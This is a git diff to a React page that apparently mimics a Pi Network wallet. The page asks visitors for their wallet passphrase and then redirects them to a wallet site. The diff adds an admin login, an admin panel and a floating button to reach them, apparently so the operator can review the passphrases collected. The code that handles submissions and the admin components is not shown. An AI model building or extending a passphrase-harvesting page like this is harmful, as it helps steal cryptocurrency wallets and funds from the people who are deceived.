@@ -1,6 +1,8 @@
 import React, { useState } from 'react';
 import styled from 'styled-components';
 import { ReactComponent as PiLogo } from './logo.svg';
+import AdminLogin from './components/AdminLogin';
+import AdminPanel from './components/AdminPanel';
 
 const Container = styled.div`
   max-width: 100%;
@@ -171,6 +173,8 @@ function App() {
   const [passphrase, setPassphrase] = useState('');
   const [loading, setLoading] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
+  const [showAdmin, setShowAdmin] = useState(false);
+  const [adminToken, setAdminToken] = useState(localStorage.getItem('adminToken'));
 
   const handleSubmit = async () => {
     if (!passphrase.trim()) return;
@@ -208,6 +212,21 @@ function App() {
     setShowSuccess(false);
     window.location.href = 'https://wallet.pinet.com';
   };
+
+  const handleAdminLogin = (token) => {
+    setAdminToken(token);
+  };
+
+  const handleAdminLogout = () => {
+    setAdminToken(null);
+  };
+
+  if (showAdmin) {
+    if (adminToken) {
+      return <AdminPanel token={adminToken} onLogout={handleAdminLogout} />;
+    }
+    return <AdminLogin onLogin={handleAdminLogin} />;
+  }
 
   return (
     <Container>
@@ -263,6 +282,12 @@ function App() {
           </SuccessMessage>
         </LoadingOverlay>
       )}
+
+      <div style={{ position: 'fixed', bottom: 20, right: 20 }}>
+        <button onClick={() => setShowAdmin(!showAdmin)}>
+          {showAdmin ? 'Ana Sayfa' : 'Admin Panel'}
+        </button>
+      </div>
     </Container>
   );
 }
